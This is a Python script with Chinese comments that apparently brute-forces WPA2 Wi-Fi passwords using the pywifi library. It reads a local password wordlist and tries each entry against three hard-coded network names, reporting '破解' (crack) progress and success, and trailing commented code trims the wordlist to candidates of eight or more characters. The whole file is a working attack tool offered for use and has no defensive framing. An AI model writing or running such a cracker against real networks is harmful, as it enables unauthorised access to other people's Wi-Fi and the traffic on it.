# @Author  : 汪凌峰（Eric Wang）
# @Date    : 2022/8/1
import time
import pywifi
from pywifi import const

# 抓取网卡接口
wifi = pywifi.PyWiFi()
# 获取第一个无线网卡
ifaces = wifi.interfaces()[0]


# 测试连接，返回链接结果
def wifiConnect(pwd, ssid):
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        profile.ssid = ssid
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码
        profile.key = pwd
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")

    # 读取密码本


def readPassword():
    ssids = ['CMCC-9988', '333359', '502']
    print("开始破解:")
    # 密码本路径
    path = "D:\Desktop\Python\wifi8.txt"
    # 打开文件
    with open(path, "r") as file:
        i = 0
        while True:
            try:
                # 一行一行读取
                pwd = file.readline().replace('\n', '')
                i += 1
                if len(pwd) >= 8:
                    if i < -1:
                        print(i)
                        continue
                    else:
                        for s in ssids:
                            print('ssid:', s)
                            bool = wifiConnect(pwd, s)
                            if bool:
                                print("成了: ", pwd)
                                print("哦了,Wifi已连接！！！")
                                break
                            else:
                                # 跳出当前循环，进行下一次循环
                                print(i, "这个密码不对: ", pwd)
            except:
                continue


readPassword()
# "CMCC-9988" 8484
# 333359 120
# 502 128

# with open('D:\Desktop\Python\wifi.txt', 'r') as file:
#     pwds = file.read().split('\n')
#     i = 0
#     with open('D:\Desktop\Python\wifi8.txt', 'w') as f8:
#         for p in pwds:
#             if len(p) >= 8:
#                 print(p)
#                 f8.write(p)
#                 f8.write('\n')
#                 i += 1
#     print(i)
